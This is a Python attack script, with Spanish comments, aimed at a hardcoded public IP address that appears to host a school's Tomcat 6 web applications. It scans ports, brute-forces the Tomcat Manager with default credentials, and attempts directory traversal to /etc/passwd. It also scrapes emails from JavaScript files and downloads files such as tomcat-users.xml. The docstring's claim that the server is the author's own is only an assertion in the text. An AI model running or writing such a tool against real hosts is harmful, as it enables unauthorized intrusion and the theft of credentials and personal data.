#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Scanner Completo para Tomcat 6.0.53 - Windows XP
Autorizado para servidor propio: 189.254.143.102
"""

import requests
import socket
import threading
from urllib.parse import urljoin
import sys
import time
import json
from bs4 import BeautifulSoup

# Configuración
TARGET = "189.254.143.102"
PORTS_TO_SCAN = range(1, 10000)  # Escaneo completo de puertos
COMMON_TOMCAT_PATHS = [
    "/", "/manager/html", "/manager/status", "/manager/jmxproxy",
    "/host-manager/html", "/docs/", "/examples/", "/admin/",
    "/webdav/", "/jsp/", "/servlets/", "/WEB-INF/", "/META-INF/",
    "/jsp/examples/", "/jsp/admin/", "/jsp/escolar/", "/jsp/seguimiento_egreso/",
    "/conf/", "/logs/", "/webapps/", "/work/", "/temp/",
    "/jsp/index.jsp", "/jsp/cerrar_sesion.jsp", "/jsp/login.jsp"
]

COMMON_TOMCAT_USERS = [
    ("admin", "admin"), ("tomcat", "tomcat"), ("admin", "tomcat"),
    ("admin", ""), ("tomcat", ""), ("admin", "password"),
    ("root", "root"), ("admin", "123456"), ("manager", "manager")
]

class TomcatScanner:
    def __init__(self, target):
        self.target = target
        self.base_url_http = f"http://{target}"
        self.base_url_https = f"https://{target}"
        self.open_ports = []
        self.found_paths = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def port_scan(self, port):
        """Escaneo individual de puerto"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target, port))
            sock.close()
            if result == 0:
                self.open_ports.append(port)
                print(f"[+] Puerto {port} abierto")
        except:
            pass
    
    def full_port_scan(self):
        """Escaneo completo de puertos con threads"""
        print("[*] Iniciando escaneo completo de puertos...")
        threads = []
        
        for port in PORTS_TO_SCAN:
            thread = threading.Thread(target=self.port_scan, args=(port,))
            threads.append(thread)
            thread.start()
            
            # Limitar número de threads concurrentes
            if len(threads) >= 100:
                for t in threads:
                    t.join()
                threads = []
        
        # Esperar threads restantes
        for t in threads:
            t.join()
        
        print(f"[+] Escaneo completado. Puertos abiertos: {sorted(self.open_ports)}")
        return sorted(self.open_ports)
    
    def check_tomcat_service(self, port):
        """Verifica si hay servicio Tomcat en el puerto"""
        protocols = ['http', 'https']
        for protocol in protocols:
            base_url = f"{protocol}://{self.target}:{port}"
            try:
                response = self.session.get(base_url, timeout=5, verify=False)
                if 'Tomcat' in response.text or 'Apache' in response.text:
                    print(f"[+] Servicio Tomcat detectado en {base_url}")
                    return protocol, port
            except:
                continue
        return None, port
    
    def discover_paths(self, base_url):
        """Descubre rutas comunes de Tomcat"""
        print(f"[*] Buscando rutas en {base_url}...")
        found = []
        
        for path in COMMON_TOMCAT_PATHS:
            url = urljoin(base_url, path)
            try:
                response = self.session.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    found.append((url, response.status_code))
                    print(f"[+] Ruta encontrada: {url} (Status: {response.status_code})")
                
                elif response.status_code == 401:
                    print(f"[!] Ruta protegida: {url} (Requiere autenticación)")
                    found.append((url, response.status_code))
                
                elif response.status_code == 403:
                    print(f"[!] Ruta prohibida: {url} (Acceso denegado)")
                
            except Exception as e:
                print(f"[-] Error en {url}: {e}")
        
        return found
    
    def brute_force_manager(self, base_url):
        """Fuerza bruta del Tomcat Manager"""
        print(f"[*] Probando credenciales en Tomcat Manager...")
        manager_url = urljoin(base_url, "/manager/html")
        
        for username, password in COMMON_TOMCAT_USERS:
            try:
                response = self.session.get(manager_url, auth=(username, password), timeout=5, verify=False)
                if response.status_code == 200:
                    print(f"[!] CREDENCIALES VÁLIDAS ENCONTRADAS: {username}:{password}")
                    return username, password
                else:
                    print(f"[-] Falló: {username}:{password}")
            except:
                print(f"[-] Error probando: {username}:{password}")
        
        return None, None
    
    def check_tomcat_version(self, base_url):
        """Intenta determinar la versión de Tomcat"""
        print(f"[*] Detectando versión de Tomcat...")
        
        # Método 1: Headers del servidor
        try:
            response = self.session.head(base_url, timeout=5, verify=False)
            server_header = response.headers.get('Server', '')
            if 'Tomcat' in server_header or 'Coyote' in server_header:
                print(f"[+] Información del servidor: {server_header}")
        except:
            pass
        
        # Método 2: Página de docs
        try:
            docs_url = urljoin(base_url, "/docs/")
            response = self.session.get(docs_url, timeout=5, verify=False)
            if 'Tomcat' in response.text:
                # Buscar versión en el HTML
                if '6.0.53' in response.text:
                    print("[+] Versión confirmada: Tomcat 6.0.53")
                elif '6.0' in response.text:
                    print("[+] Versión detectada: Tomcat 6.x")
        except:
            pass
    
    def scan_js_files(self, base_url):
        """Analiza archivos JavaScript en busca de información sensible"""
        print(f"[*] Analizando JavaScript...")
        
        try:
            response = self.session.get(base_url, timeout=5, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            scripts = soup.find_all('script')
            
            for script in scripts:
                src = script.get('src')
                if src:
                    js_url = urljoin(base_url, src)
                    try:
                        js_response = self.session.get(js_url, timeout=5, verify=False)
                        # Buscar patrones sensibles
                        if 'password' in js_response.text.lower():
                            print(f"[!] Posible contraseña en: {js_url}")
                        if '@' in js_response.text:
                            # Buscar emails
                            import re
                            emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', js_response.text)
                            for email in emails:
                                print(f"[!] Email encontrado: {email}")
                    except:
                        pass
        except Exception as e:
            print(f"[-] Error analizando JS: {e}")
    
    def check_vulnerabilities(self, base_url):
        """Verifica vulnerabilidades comunes de Tomcat 6"""
        print(f"[*] Verificando vulnerabilidades...")
        
        vulns = {
            "Directory Traversal": "/examples/jsp/include/include.jsp?page=../../../../etc/passwd",
            "JSP Samples Accessible": "/examples/",
            "Docs Accessible": "/docs/",
            "WebDAV Enabled": "/webdav/",
            "Default Files": "/WEB-INF/web.xml"
        }
        
        for vuln_name, path in vulns.items():
            url = urljoin(base_url, path)
            try:
                response = self.session.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    print(f"[!] VULNERABILIDAD: {vuln_name} - Accesible en {url}")
                elif response.status_code == 403:
                    print(f"[+] {vuln_name} - Correctamente protegido")
            except:
                print(f"[-] Error verificando {vuln_name}")
    
    def search_config_files(self, base_url):
        """Busca archivos de configuración sensibles"""
        print(f"[*] Buscando archivos de configuración...")
        
        config_files = [
            "/WEB-INF/web.xml",
            "/conf/tomcat-users.xml",
            "/conf/server.xml",
            "/conf/context.xml",
            "/logs/catalina.out",
            "/logs/localhost.log",
            "/webapps/manager/WEB-INF/web.xml"
        ]
        
        for config_file in config_files:
            url = urljoin(base_url, config_file)
            try:
                response = self.session.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    print(f"[!] ARCHIVO DE CONFIGURACIÓN ENCONTRADO: {url}")
                    
                    # Guardar contenido para análisis posterior
                    filename = f"config_{config_file.replace('/', '_')}.txt"
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(response.text)
                    print(f"    [+] Contenido guardado en: {filename}")
                    
            except Exception as e:
                print(f"[-] Error accediendo a {url}: {e}")
    
    def comprehensive_scan(self):
        """Escaneo completo del servidor Tomcat"""
        print("=== ESCÁNER COMPLETO TOMCAT 6.0.53 ===")
        print(f"Objetivo: {self.target}")
        print("=" * 50)
        
        # 1. Escaneo de puertos
        open_ports = self.full_port_scan()
        
        # 2. Verificar servicios Tomcat en puertos abiertos
        tomcat_services = []
        for port in open_ports:
            protocol, port = self.check_tomcat_service(port)
            if protocol:
                tomcat_services.append((protocol, port))
        
        # 3. Escaneo en cada servicio Tomcat encontrado
        for protocol, port in tomcat_services:
            base_url = f"{protocol}://{self.target}:{port}"
            print(f"\n[*] Escaneando servicio Tomcat en {base_url}")
            
            # 3.1 Detectar versión
            self.check_tomcat_version(base_url)
            
            # 3.2 Descubrir rutas
            paths = self.discover_paths(base_url)
            self.found_paths.extend(paths)
            
            # 3.3 Fuerza bruta del manager
            self.brute_force_manager(base_url)
            
            # 3.4 Analizar JavaScript
            self.scan_js_files(base_url)
            
            # 3.5 Buscar archivos de configuración
            self.search_config_files(base_url)
            
            # 3.6 Verificar vulnerabilidades
            self.check_vulnerabilities(base_url)
        
        # 4. Generar reporte
        self.generate_report()
    
    def generate_report(self):
        """Genera un reporte completo del escaneo"""
        print("\n" + "=" * 50)
        print("REPORTE FINAL DEL ESCANEO")
        print("=" * 50)
        
        report = {
            "target": self.target,
            "open_ports": self.open_ports,
            "found_paths": self.found_paths,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Guardar reporte en JSON
        with open(f"tomcat_scan_report_{self.target}.json", "w") as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Reporte guardado en: tomcat_scan_report_{self.target}.json")
        print(f"[+] Puertos abiertos: {len(self.open_ports)}")
        print(f"[+] Rutas encontradas: {len(self.found_paths)}")
        
        # Mostrar rutas interesantes
        print("\nRUTAS MÁS RELEVANTES:")
        for path, status in self.found_paths:
            if status == 200:
                print(f"  ✓ {path}")
            elif status == 401:
                print(f"  🔐 {path} (Protegida)")

def main():
    # Desactivar advertencias SSL para desarrollo
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    scanner = TomcatScanner(TARGET)
    scanner.comprehensive_scan()

if __name__ == "__main__":
    main()